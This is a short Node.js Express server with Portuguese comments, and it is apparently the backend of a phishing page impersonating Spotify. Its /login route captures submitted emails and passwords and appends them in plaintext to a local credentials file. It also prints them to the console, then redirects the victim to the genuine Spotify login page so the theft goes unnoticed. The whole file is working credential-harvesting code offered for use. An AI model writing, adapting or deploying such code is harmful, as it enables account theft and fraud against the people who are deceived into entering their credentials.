const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const morgan = require('morgan');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para logging
app.use(morgan('combined'));

// Middleware para permitir CORS
app.use(cors());

// Middleware para parsear dados de formulários
app.use(bodyParser.urlencoded({ extended: true }));

// Middleware para servir arquivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// Rota para receber os dados do formulário
app.post('/login', (req, res) => {
    const email = req.body.username;
    const senha = req.body.password;

    // Cria o diretório, se não existir
    const dirPath = process.env.CREDENTIALS_DIR || path.join(__dirname, 'credenciais');
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }

    // Caminho completo para o arquivo
    const filePath = path.join(dirPath, 'login.txt');

    // Formato de salvamento das credenciais
    const userData = `Email: ${email}, Senha: ${senha}\n`;

    // Salva os dados no arquivo
    fs.appendFile(filePath, userData, (err) => {
        if (err) {
            console.error('Erro ao salvar os dados:', err);
            res.status(500).send('Erro ao salvar os dados.');
        } else {
            console.log('Dados salvos com sucesso:', userData);
            res.redirect('https://accounts.spotify.com/pt-BR/login');
        }
    });
});

// Inicia o servidor
app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
});

